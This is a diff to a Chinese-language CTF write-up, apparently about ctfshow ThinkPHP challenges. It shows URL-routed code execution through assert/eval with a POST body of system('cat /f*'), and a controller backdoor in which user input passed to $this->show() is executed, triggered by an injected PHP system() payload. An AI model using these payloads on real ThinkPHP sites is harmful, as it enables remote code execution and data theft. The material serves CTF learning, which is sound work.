@@ -34,7 +34,24 @@ return array(
 这里通过/index.php/ctfshow/函数名/参数  调用利用
 如：
 /index.php/ctfshow/system/pwd
-/index.php/ctfshow/assert/eval($_POST[1])/   同时post： 1=system('cat /f*');
+/index.php/ctfshow/assert/eval($_POST[1])   同时post： 1=system('cat /f*');
+```
+
+^
+#### **3、框架特性漏洞**
+使用$this->show()直接渲染存在代码执行
+```
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index($n=''){
+        $this->show('<p>hello,'.$n.'黑客建立了控制器后门，你能找到吗</p>','utf-8');
+    }
+}
+
+这里传入
+/index.php/home/index/index?n=<?php system("cat /f*");?>
 ```
 
 
